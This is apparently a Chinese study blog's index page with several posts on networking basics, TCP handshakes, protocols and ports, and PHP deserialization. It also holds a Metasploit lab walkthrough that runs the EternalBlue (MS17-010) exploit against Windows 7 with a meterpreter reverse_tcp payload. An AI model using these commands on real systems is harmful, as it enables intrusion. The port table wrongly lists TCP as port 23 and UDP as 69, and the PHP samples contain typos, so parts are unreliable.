<h2 id="计算机网络与因特网"><a href="#计算机网络与因特网" class="headerlink" title="计算机网络与因特网"></a>计算机网络与因特网</h2><p>一、具体构成的描述：对于什么是因特网这个问题有两种回答方式：其一，我们能够描述因特网的具体构成，即因特网的基本硬件和软件组件；其二，我们能够根据分布式应用提供的联网基础设施来描述因特网。<br>1、端系统<br> （1）定义：端系统（主机）：处于因特网的边缘部分就是在因特网上的所有主机，即与因特网相连的设备，此处的“端”是“末端”之意。端系统可以是手表、平板电脑、电视等。<br>（2）具体功能：<br>&lt;1&gt;端系统通过通信链路和分组交换机连接在一起。（对于通信链路和分组交换机的详细介绍会在下一章）。通信链路有不同类型的物理媒体组成，这些物理媒体包括同轴电缆、铜线、光纤和无线电频谱。不同的链路能够以不同的速率传输数据，链路的传输速率以比特/秒度量。当一台端系统向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节。由此形成的信息包用计算机网络的术语来说称为分组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[发送端系统] -- 数据分段 -- 加上首部字节--&gt;B[目的端系统] </span><br></pre></td></tr></table></figure>
<p>&lt;2&gt;端系统通过因特网服务提供商（ISP）接入因特网，每个ISP自身就是一个由多台分组交换机和多段通信链路组成的网络。各ISP为端系统提供了各种不同类型的网络接入。<br>&lt;3&gt;协议：端系统、分组交换机和其他因特网部件都要运行一系列协议。协议相关知识可见<a target="_blank" rel="noopener" href="https://editor.csdn.net/md/?articleId=112858711">计算机网络开放的端口和协议</a><br>（3）服务描述<br>我们现在从为应用程序提供服务的基础设施的角度来描述因特网。因特网除了传统的web冲浪应用外，还有在线社交网络、视频会议等。因为这些应用程序涉及多个相互交换数据的端系统，所以它们被称为分布式应用程序。<br>2、接入网<br>(1)家庭接入:DSL、电缆、FTTH、拔号和卫星<br>当前，宽带住宅接入有两种最流行的类型:数字用户线和电缆。<br>&lt;1&gt;电话线接入：住户通常从提供本地电话接入的本地电话公司处获得DSL因特网接入。因此，当使用DSL时，用户的本地电话公司也是它的ISP。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">B[家庭电话]  --&gt; A[分配器]</span><br><span class="line">C[DSL调制解调器] --&gt;A</span><br><span class="line"> D[家庭PC] --&gt;C</span><br><span class="line"> A --&gt;   E[中心局]</span><br><span class="line"> E --&gt;F[因特网]</span><br><span class="line"> E --&gt;G[电话网]</span><br></pre></td></tr></table></figure>
<p>如图所示，每个用户的DSL调制解调器使用现有的电话线与位于电话公司的本地中心局（CO）中的数字用户线接入复用器（DSLAM）交换数据。家庭的DSL调制解调器得到数字数据后将其转换为高频音，以通过电话线传输给本地中心局；来自许多家庭的模拟信号在DSLAM处被转换回数字形式.<br>这种电话线接入因为上行速率和下行速率不一致，所以这种接入不对称。<br>&lt;2&gt;电缆因特网接入：电缆因特网接入利用了有线公司现有的有线电视基础设施。住宅从提供有线电视的公司获得了电缆因特网接入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[数以万计的家庭] -- 同轴电缆 --&gt; B((光纤节点))</span><br><span class="line">A[数以万计的家庭]--&gt; C((光纤节点)) </span><br><span class="line">B --&gt;D[CMTS]</span><br><span class="line">C --&gt;D[CMTS]</span><br><span class="line">D --&gt;F[因特网]</span><br></pre></td></tr></table></figure>
<p>电缆因特网接入需要特殊的调制解调器，这种调制解调器被称为电缆调制解调器。如同DSL调制解调器，电缆解调器通常是一个外部设备，通过一个以太网连接到家庭PC（以太网后面会介绍到）在电缆头端，电缆调制解调器端接系统与DSL网络的DSLAM具有类似的功能，即将来许多下行家庭中的电缆调制解调器发送的模拟信号转换回数字形式。<br>&lt;3&gt;电缆因特网接入特征：<br>1.接入通常是不对称的，下行信道分配的传输速率通常比上行信道高。<br>2.共享广播媒体。如果几个用户同时经下行信道下载0一个视频文件，每个用户接收文件的实际速率大大低于电缆总计的下行速率</p>
<h2 id="排队时延和分组丢失"><a href="#排队时延和分组丢失" class="headerlink" title="排队时延和分组丢失"></a>排队时延和分组丢失</h2><p>每台分组交换机有多条链路与之相连。对于每条相连的链路,该分组交换机具有一个输出缓存(output buffer,也称为输出队列(output queue)),它用于存储路由器准备发往那条链路的分组。该输出缓存在分组交换中起着重要的作用。除了存储转发时延以外,分组还要承受输出缓存的排队时延(queuing delay)。这些时延是变化的,变化的程度取决于网络的拥塞程度。因为缓存空间的大小是有限的,一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。在此情况下,将出现分组丢失(丢包)(packet loss),到达的分组或已经排队的分组之一将被丢弃。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/18/%E6%B5%85%E8%B0%88msf/">
                Metasploit渗透测试框架的基本使用
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p> @<a href="Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">TOC</a></p>
<h2 id="Metasploit渗透测试框架介绍"><a href="#Metasploit渗透测试框架介绍" class="headerlink" title="Metasploit渗透测试框架介绍"></a>Metasploit渗透测试框架介绍</h2><p><img src="https://img-blog.csdnimg.cn/20210410103503577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="1、简介：Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。
2、Metasploit体系框架"><br>&lt;1&gt;基础库：Metasploit基础库文件位于源码目录路径下的libraries目录中，包括Rex，framework和framework-base三部分。<br> Rex是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、postgreSQL以及MYSQL数据库支持等；<br> &lt;2&gt;模块：模块组织按照不同的用途分为6种类型的模块<br> 分为辅助模块（Aux）、渗透攻击模块（Exploits）、后渗透攻击模块（Post）、攻击载荷模块（payloads）、编码器模块（Encoders）、空指令模块（Nops）。<br> 注：payload又称攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。<strong>可以理解为后门</strong><br> &lt;3&gt;插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如Nessus、OpenVAS漏洞扫描器等<br> &lt;4&gt;接口:包括msfconsole控制终端、msfcli命令行、msfgui图形化界面、armitage图形化界面以及msfapi远程调用接口。e<br> &lt;5&gt;功能程序: metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。比如msfpayload、msfencode和msfvenom可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。</p>
<h2 id="Metasploit目录"><a href="#Metasploit目录" class="headerlink" title="Metasploit目录"></a>Metasploit目录</h2><p><img src="https://img-blog.csdnimg.cn/2021041011024921.png" alt="在这里插入图片描述">data是Metasploit使用的可编辑文件<br>modules是模块<br>lib是框架<br>plugins是插件<br>scripts是Metasploit和其他脚本</p>
<h2 id="实战训练"><a href="#实战训练" class="headerlink" title="实战训练"></a>实战训练</h2><p>攻击机：kali2020<br>被攻击机：windows7（445端口开启、windowsdefener关闭）<br>第一步：打开msf<br><img src="https://img-blog.csdnimg.cn/2021042416135198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二步：永恒之蓝漏洞编号为ms17-010</p>
<p><img src="https://img-blog.csdnimg.cn/20210424161947609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第三步：利用辅助模块扫描目标<br>use 1<br><img src="https://img-blog.csdnimg.cn/2021042416223116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看所需设置：options<br>yes为必须设置<br>设置目标地址：set rhosts +IP地址<br>设置目标端口：set rpost +445<br>攻击：run<br>第四步：</p>
<p><img src="https://img-blog.csdnimg.cn/20210424163908565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看所需设置options<br>设置目标地址：set RHOSTS windows7ip<br>设置目标端口：set RPORT 445<br>设置payload：set payload windows/x64/meterpreter/reverse_tcp<br>设置本地地址：set LHOST 本地IP<br>攻击：run</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/18/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/">
                TCP握手
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p><strong>建立TCP连接需要发送三个包才能建立，而断开连接则需要发送四个包，所以被称为TCP三次握手四次挥手。</strong></p>
<h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><p>第一次握手：建立连接时，客户端发送syn包（syn=x）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号。<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=x+1），同时自己也发送一个SYN包（syn=y），即SYN+ACK包，此时服务器进入SYN_RECV状态；<br>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。<br><img src="https://img-blog.csdnimg.cn/20210427171052929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><p>客户端→服务端：发送FIN报文，表示没有要发送的数据，并询问服务端有无没有发送的数据。如果还有没发送完的数据可不必关闭socket，继续发送。<br>服务端→客户端：发送ACK表示还未确定是否有未发送完的数据，Client端进入FIN_WAIT状态。<br>服务端→客户端：Server端确认数据发送完成后发送FIN报文，表示Client端可以关闭连接了。<br>客户端→服务端：发送ACK后进入TIME_WAIT状态，Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭。<br><strong>注意：为什么建立连接需要三次握手而解除需要四次挥手呢？<br>因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步挥手。</strong><br><img src="https://img-blog.csdnimg.cn/20210427171316659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>与UDP不同的是，TCP通过三次握手四次挥手避免了掉包情况的发生</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/18/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                序列化与反序列化
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>@<a href="%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">TOC</a></p>
<h2 id="序列化与反序列化定义"><a href="#序列化与反序列化定义" class="headerlink" title="序列化与反序列化定义"></a>序列化与反序列化定义</h2><p>一、序列化：指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。<br><strong>简单来说就是将对象转化成字符串</strong><br>二、目的：方便存储与网络运输<br>三、反序列化：与序列化相反</p>
<h2 id="代码举例"><a href="#代码举例" class="headerlink" title="代码举例"></a>代码举例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> //定义一个类//</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public $name = <span class="string">&#x27;studentone&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;deelmind&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">function__construct</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">echo<span class="string">&quot;__construct&quot;</span><span class="comment">//构造函数//</span></span><br><span class="line">echo<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> Student();</span><br><span class="line">echo $s-&gt;getName().<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">$s_serialize=serialize($s);</span><br><span class="line">print_r($s_serialize);</span><br><span class="line">echo<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210402181244293.png" alt="在这里插入图片描述"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> //定义一个类//</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public $name = <span class="string">&#x27;studentone&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;deelmind&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">function__construct</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">echo<span class="string">&quot;__construct&quot;</span><span class="comment">//构造函数//</span></span><br><span class="line">echo<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">$Student = <span class="string">&#x27;0:7:&quot;Student&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;studentone&quot;;&#125;&#x27;</span>;</span><br><span class="line">$s_unserialize = unseralize($Student);</span><br><span class="line">print_r($s_unseralize);</span><br><span class="line">echo<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210403091346941.png" alt="在这里插入图片描述"></p>
<h2 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h2><p>反序列化漏洞就是指黑客序列化一个包含恶意代码的实例对象（通常是Runtime.exec来执行后台命令），此时会得到对象的字节数据。然后字节数据通过接口发送到服务端（被攻击的服务器）。服务器在反序列化出对象的过程中（readObject方法里面）就会触发触发恶意代码执行，从而达到攻击的目的。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AB%AF%E5%8F%A3%E5%8D%8F%E8%AE%AE/">
                计算机网络开放的端口协议
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="学习目标-计算机网络开放的端口和协议"><a href="#学习目标-计算机网络开放的端口和协议" class="headerlink" title="学习目标 : 计算机网络开放的端口和协议"></a>学习目标 : 计算机网络开放的端口和协议</h1><h2 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h2><p><strong>一、计算机网络端口</strong></p>
<p>1、定义：计算机“端口”是英文port的义译，可以认为是计算机与外界通讯交流的出口；<br>2、分类：分为软件端口和硬件端口；<br><strong>二、网络协议</strong><br>1、定义：网络协议为计算机网络中进行数据交换而建立的规则、标准或约定的集合；<br>2、组成：(1) 语义：语义是解释控制信息每个部分的意义。它规定了需要发出何种控制信息，以及完成的动作与做出什么样的响应；<br>                  (2）语法：语法是用户数据与控制信息的结构与格式，以及数据出现的顺序；<br>                  (3) 时序：时序是对事件发生顺序的详细说明。</p>
<p><strong>三、常用端口、协议及所处层次</strong><br>| 协议名称|  服务 |  网络层|   端口号      |<br>|–|–|– |–  |<br>| 文件传输协议 | FTP |  应用层 |21号端口<br>|远程登录协议|Telnet|应用层|  23号端口|<br>|简单邮件传输协议|SMTP|应用层| 25号端口 |<br>|    域名服务器|DNS|应用层 |53号端口  |<br>|超文本传输协议|HTTP|应用层|80号端口  |<br>|网上新闻传输协议|NNTP| 应用层|119号端口 |<br>|    第二代简单邮局协议|POP2| 应用层|  109号端口|<br>|    网络消息访问协议|IMAP|应用层|143号端口|<br>|控制报文协议|ICMP|网络层|无端口号  |<br>|网络之间互连的协议|IP|网络层 |0 到65535（2^16-1）  |<br>|    远程过程调用协议|RPC|会话层|111号端口 |<br>|传输控制协议|TCP|传输层|23号端口  |<br>|用户数据报协议|UDP|传输层|69号端口 |<br>网络层<br><img src="https://img-blog.csdnimg.cn/20210123171232143.png" alt="在这里插入图片描述"></p>
<p>传输层<br><img src="https://img-blog.csdnimg.cn/20210123171357693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>应用层<br><img src="https://img-blog.csdnimg.cn/2021012317144746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>四、计算机网络体系结构分层</strong><br><img src="https://img-blog.csdnimg.cn/20210120155512726.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="学习成果"><a href="#学习成果" class="headerlink" title="学习成果"></a>学习成果</h2><p>1、了解计算机网络端口与网络协议；<br>2、计算机网络开放的端口及所在层次；<br>3、计算机网络体系结构分层。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/18/%E5%9B%BE%E8%A7%A3tcp/">
                《图解TCP/IP》精简笔记
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="学习目标：《图解TCP-IP》精简笔记"><a href="#学习目标：《图解TCP-IP》精简笔记" class="headerlink" title="学习目标：《图解TCP/IP》精简笔记"></a>学习目标：《图解TCP/IP》精简笔记</h1><h1 id="学习内容："><a href="#学习内容：" class="headerlink" title="学习内容："></a>学习内容：</h1><p>一、计算机网络背景<br>1、广域网与局域网；<br>2、OSI开放式通信系统互联参考模型：<br>&lt;1&gt;应用层：为应用程序提供服务并规定应用程序中通信相关的细节。针对特定应用的协议，电子邮件协议，远程登录协议，文件传输协议;<br>&lt;2&gt;表示层：主要负责格式转换。接受不同表现形式的信息，文字流，图像，声音等。将应用处理的信息转换为适合网络传输的格式，或者将来自下一层的数据转换为上层能够处理的格式；<br>&lt;3&gt;会话层：负责建立和断开通信连接，以及数据的分割和传输。何时建立连接，何时断开，以及保持多久连接<br>&lt;4&gt;传输层：可靠传输的作用。是否有数据丢失；<br>&lt;5&gt;网络层：经过哪个路由传递到目标地址；<br>&lt;6&gt;数据链路层：数据帧与比特流之间的转换；<br>(比特流：内容分发协议，它采用高效的软件分发系统和点对点技术共享大体积文件（如一部电影或电视节目），并使每个用户像网络重新分配结点那样提供上传服务。一般的下载服务器为每一个发出下载请求的用户提供下载服务，而BitTorrent的工作方式与之不同。分配器或文件的持有者将文件发送给其中一名用户，再由这名用户转发给其它用户，用户之间相互转发自己所拥有的文件部分，直到每个用户的下载都全部完成。这种方法可以使下载服务器同时处理多个大体积文件的下载请求，而无须占用大量带宽。）<br>&lt;7&gt;物理层：比特流与电子信号之间的切换；<br><img src="https://img-blog.csdnimg.cn/20210123165503641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210123170042735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、传输方式分类<br>1）是否需要预先建立连接分类：<br>面向有连接型：发送数据之前需要在收发主机之间连接一条通信线路，例如电话；<br>面向无连接型：发送端于任何时候自由发送数据，接收端也永远不知道自己会在何时从哪接受数据，此时接收端需要时常确认是否接受了数据，例如发邮包；<br>2）交换方式分类<br>电路交换：交换机主要负责数据的中转处理。计算机首先被连接到交换机上，而交换机与交换机之间则由众多的通信线路再继续连接，计算机之间发生数据时需要先通过交换机与目标主机建立通信电路。<br>3）分组交换：<br> &lt;1&gt;为了防止电路交换中，两台计算机独占线路，实现并发交换。连接到通信电路上的计算机所要发送的数据分成多个数据包，按照一定的顺序排列之后分别发送。由于每个数据包都写入了发送端与接收端的地址，所以即使在同一条线路也可以同时为多个用户提供服务。<br>&lt;2&gt;分组交换中，分组交换机连接通信线路，发送端计算机将数据分组发送给路由器，路由器收到这些分组数据以后缓存到自己的缓冲区的队列中，然后再转发给目标计算机。也叫“蓄积交换”。<br>&lt;3&gt;由于网络拥堵，路由器可能发生缓存饱和或者溢出，甚至出现分组数据丢失。<br>4)根据接收端数量分类<br>&lt;1&gt;单播（Unicast）：1对1通信；<br>&lt;2&gt;广播（Broadcast）：对应的能接受到广播的计算机范围成为广播域，如果频段信息；<br>&lt;3&gt;多播（Multicast）：指定特定的一组主机作为接收端，如电视会议；<br>&lt;4&gt;任播（Anycast）：在特定的多台主机中选出一台作为接收端。类似多播在特定的一组主机中任选。在DNS根域名解析服务器中有应用。<br>4、地址<br>1）唯一性：一个地址必须明确地表示一个对象；<br>2）层次性：通过分层树状结构实现快速检索，如电话号码，实际住址。也有无层次的地址，如MAC地址。<br>3）MAC与IP在标识一个主体时都具有唯一性，但只有IP有层次性；MAC虽然是最终通信的地址，但寻址过程中IP地址必不可少；<br>4）P地址的分层：<br>&lt;1&gt;IP地址由网络号和主机号两部分组成；<br>&lt;2&gt;网络号相同的主机在组织结构，提供商类型和地域分布上都比较集中。<br>5)网络传输中，每个节点会根据分组数据的地址信息，来判断该报文应该由哪个网卡发送出去。为此，各个地址会参考一个发出接口列表。MAC寻址是地址转发表，IP寻址是路由控制表<br>5、现代网络<br>1）核心网：计算机网络中的“高速公路”；使用高速路由器快速传输大量数据。<br>2）边缘网络：“高速公路”的出入口；常用多功能路由器和3层交换机。<br>3）接入层（汇聚层）：计算机网络中连接边缘网络的部分，常用2层交换机和3层交换机。<br>4）互联网通信：用户A - 接入层 - 【边缘网络】 - 【主干网】 - 【边缘网络】 - 接入层 - 用户B。有时候在接入层就可以完成通信。<br>5）移动通信：手机终端A - 基站 - 通信控制中心 - 声音主干网/数据主干网 - 通信控制中心 - 基站 - 手机终端B。<br>6）信息发布者：信息发布者将信息发布到数据中心，数据中心内部的网络分布着3层交换机和高速路由器。数据中心通常接入主干网或边缘网络可以实现大带宽高速数据传输，以此处理对该信息的大量访问。<br>6、虚拟化技术与云<br>1）虚拟化技术：当一个网站需要调整运营所使用的资源时，并不增减服务器，存储设备，网络等实际的物理设备，而是通过软件将这些物理设备虚拟化，在有必要的时候进行增减。以此达到按需分配，按比例分配，对外提供可靠的服务。<br>2）云：利用虚拟化技术根据使用者的情况动态调整必要资源的机制为“云”。</p>
<p>二、<strong>TCP/IP基础知识</strong><br>1、TCP/IP协议簇：<br>1）应用层：HTTP，SMTP，FTP，TELNET，SNMP；<br>2）传输层：TCP，UDP<br>3）网络层：IP，ICMP，ARP<br>4）路由控制协议：RIP，OSPF，BGP<br>2、IETF/RFC：TCP/IP协议由IETF讨论制定，需要标准化的协议被列入RFC（Request For Comment）；<br>3、互联网中的每个网络都是由骨干网（BackBone）和末端网（Stub）组成的。每个网络之间通过NOC（Network Operation Center）相连。如果网络运营商不同，网络连接方式和使用方法也会不同，连接这种异构网络需要IX（Internet Exchange）支持。互联网是一个由众多异构网络通过IX连接起来的一个巨型网络；<br>4、OSI七层<br>由谁实现：<br>应用程序：应用层，表示层，会话层；<br>操作系统：传输层，网络层；<br>设备驱动与网络接口：数据链路层，物理层。<br>硬件（物理层）：以太网或者电话线；<br>网络接口层（数据链路层）：相当于NIC（网卡）的驱动程序，驱动程序是操作系统与硬件之间的桥梁，直接插入硬件是无法正常工作的。<br>互联网层（网络层）：IP协议的作用是将分组数据包发送到目的主机，通过互联网层可以忽略网络结构的细节，从相互通信的主机角度看，对端主机就如同在一个云层对面。<br>连接互联网的所有主机跟路由器都实现IP的功能。但网桥，中继器和集线器可以不用实现IP或TCP功能，因为它们处于第3层以下。<br>IP：是分组交换的协议，但不具备重发机制。可能出现丢包，属于非可靠传输协议。<br>ICMP：IP数据包发送途中一旦发生异常导致无法到达对面地址时，无药给发送端返回一个异常通知。这便是ICMP的作用。例如：ping命令。<br>ARP：从分组数据包的IP地址中解析出物理地址（MAC）的一种协议。<br>传输层：让应用程序之间实现通信。通过端口号识别。对于正在通信的2个程序而已，中间细节全被忽略如同一朵云。<br>TCP：面向有连接的传输协议。可以正确处理丢包，传输乱序等异常，还可以有效利用带宽。但建立与断开至少需要7次发包收包（3次握手，4次挥手），浪费网络流。不适合视频会议。<br>UDP：面向无连接传输层协议。用于多播或者广播等视频通信领域<br>应用层（会话层以上）<br>会话层，表示层，应用层都由应用程序实现。<br>TCP/IP应用架构多数属于客户端/服务端模型。<br>WWW，万维网：是一种互联网上数据读写规范<br>浏览器与服务端之间用HTTP通信（应用层）；<br>传输数据主要格式是HTML（表示层）。<br>E-mail<br>发送电子邮件协议为SMTP（Simple Mail Transfer Protocol）；<br>电子邮件格式由MIME协议（表现层）拓展。<br>FTP（文件传输协议）<br>传输可以选择二进制还是文本格式。在Windows和macOS或Unix等系统间进行文件传输时会自动修改换行符，这时由于表示层；<br>FTP进行文件传输时会建立2个TCP协议，一个用于发出请求时需要的控制连接，一个是实际传输连接。这个是会话层功能。<br>远程登录（TELNET和SSH，UNIX的rlogin，Windows的X协议）<br>网络管理（SNMP，Simple Network Management Protocol）<br>使用SNMP管理的主机，网桥，路由器称作SNMP代理（agent）；<br>可以通过表示层协议MIB（Management Information 